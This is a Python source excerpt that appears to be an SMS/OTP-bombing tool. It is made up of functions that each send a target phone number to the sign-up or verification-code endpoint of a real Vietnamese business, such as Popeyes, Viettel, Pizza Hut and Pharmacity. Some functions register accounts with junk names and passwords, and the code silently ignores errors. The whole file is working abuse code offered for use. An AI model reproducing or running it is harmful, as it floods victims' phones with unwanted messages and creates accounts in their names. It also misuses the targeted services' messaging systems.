...
def popeyes(sdt):
    try:
        requests.post('https://api.popeyes.vn/api/v1/register',
            headers={'Host':'api.popeyes.vn','content-type':'application/json','origin':'https://popeyes.vn'},
            data='{"phone":"'+sdt+'","firstName":"Cac","lastName":"Lo","email":"kong@gmail.com","password":"12345gdtg"}', timeout=3)
    except: pass

def alfrescos(sdt):
    try:
        requests.post('https://api.alfrescos.com.vn/api/v1/User/SendSms',
            headers={'Host':'api.alfrescos.com.vn','brandcode':'ALFRESCOS','content-type':'application/json'},
            data='{"phoneNumber":"'+sdt+'","secureHash":"66148faf3cab6e527b8b044745e27dbd","type":1}', timeout=3)
    except: pass
...
def bibabo(sdt):
    try:
        requests.post("https://bibabo.vn/user/verify-phone",
            ...
            data={"phone":sdt,"token":"UkkqP4eM9cqQBNTTmbUOJinoUZmcEnSE8wwqJ6VS"}, timeout=3)
    except: pass
...
def gapo(sdt):
    try:
        requests.post("https://api.gapo.vn/auth/v2.0/signup",
            ...
            data=json.dumps({"device_id":"30a1bfa0-533f-45e9-be60-b48fb8977df2","phone_number":"+84-"+sdt[1:11],"otp_type":0}), timeout=3)
    except: pass

def vieon(sdt):
    try:
        requests.post('https://api.vieon.vn/backend/user/register/mobile?platform=mobile_web&ui=012021',
            headers={'Host':'api.vieon.vn','content-type':'application/x-www-form-urlencoded'},
            data={'phone_number':sdt,'password':'1234gdtg','device_id':'57f3ffd77ad209a626c1ea607d0c4775','platform':'mobile_web','ui':'012021'}, timeout=3)
    except: pass

def meta(sdt):
    try:
        requests.post('https://meta.vn/app_scripts/pages/AccountReact.aspx?api_mode=1',
            headers={'Host':'meta.vn','content-type':'application/json','origin':'https://meta.vn'},
            data='{"api_args":{"lgUser":"'+sdt+'","act":"send","type":"phone"},"api_method":"CheckExist"}', timeout=3)
    except: pass
...
def viettel(phone):
    try:
        requests.post('https://vietteltelecom.vn/api/get-otp-login',
            ...
            json={'phone':phone,'type':''}, timeout=3)
    except: pass

def tgdd(sdt):
    try:
        requests.post('https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
            headers={'Host':'www.thegioididong.com','content-type':'application/x-www-form-urlencoded','x-requested-with':'XMLHttpRequest'},
            data={'phoneNumber':sdt,'isReSend':'false','sendOTPType':'1'}, timeout=3)
    except: pass
...
def pizzahut(sdt):
    try:
        requests.post("https://pizzahut.vn/callApiStorelet/user/registerRequest",
            ...
            data=json.dumps({"keyData":f"appID=vn.pizzahut&lang=Vi&ver=1.0.0&clientType=2&udId=%22%22&phone={sdt}"}), timeout=3)
    except: pass
...
def concung(phone):
    try:
        requests.post("https://concung.com/ajax.html",
            ...
            data={"ajax":"1","classAjax":"AjaxLogin","methodAjax":"sendOtpLogin","customer_phone":phone}, timeout=3)
    except: pass

def nhathuoclongchau(sdt):
    try:
        requests.post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
            headers={'Host':'api.nhathuoclongchau.com.vn','content-type':'application/json'},
            data='{"phoneNumber":"'+sdt+'","otpType":0,"fromSys":"WEBKHLC"}', timeout=3)
    except: pass

def pharmacity(sdt):
    try:
        requests.post('https://api-gateway.pharmacity.vn/customers/register/otp',
            headers={'Host':'api-gateway.pharmacity.vn','content-type':'application/json'},
            data='{"phone":"'+sdt+'","referral":""}', timeout=3)
    except: pass

def ghn(sdt):
    try:
        requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp',
            headers={'Host':'online-gateway.ghn.vn','content-type':'application/json'},
            data='{"phone":"'+sdt+'","type":"register"}', timeout=3)
    except: pass

def beecow(sdt):
    try:
        requests.post('https://api.beecow.com/api/register/gosell',
            headers={'Host':'api.beecow.com','content-type':'application/json'},
            data='{"password":"12345cc@","displayName":"","locationCode":"VN-SG","langKey":"vi","mobile":{"countryCode":"+84","phoneNumber":"'+sdt+'"}}', timeout=3)
    except: pass

def thantaioilo(phone):
    try:
        requests.post("https://api.thantaioi.vn/api/user/send-one-time-password",
            headers={"Host":"api.thantaioi.vn","Content-Type":"application/json","Origin":"https://thantaioi.vn"},
            data=json.dumps({"phone":f"84{phone[1:11]}"}), timeout=3)
    except: pass

def vayvnd(sdt):
    try:
        requests.post('https://api.vayvnd.vn/v2/users',
            headers={'Host':'api.vayvnd.vn','content-type':'application/json'},
            data='{"phone":"'+sdt+'","utm":[{"utm_source":"google","utm_medium":"organic"}],"sourceSite":3}', timeout=3)
    except: pass

def ecogreen(sdt):
    try:
        requests.post('https://ecogreen.com.vn/api/auth/register/send-otp',
            headers={'Host':'ecogreen.com.vn','content-type':'application/json'},
            data='{"phone":"'+sdt+'"}', timeout=3)
    except: pass

def phuclong(sdt):
    try:
        requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/register',
            headers={'Host':'api-crownx.winmart.vn','content-type':'application/json'},
            data='{"phoneNumber":"'+sdt+'","fullName":"Lo Cac","email":"KAka@gmail.com","password":"12345cc@@@"}', timeout=3)
    except: pass
...
def oldloship(phone):
    try:
        requests.post("https://mocha.lozi.vn/v6/invites/use-app",
            headers={"Content-Type":"application/json"},
            data=json.dumps({"device":"Android","platform":"Chrome","countryCode":"84","phoneNumber":phone[1:11]}), timeout=3)
    except: pass
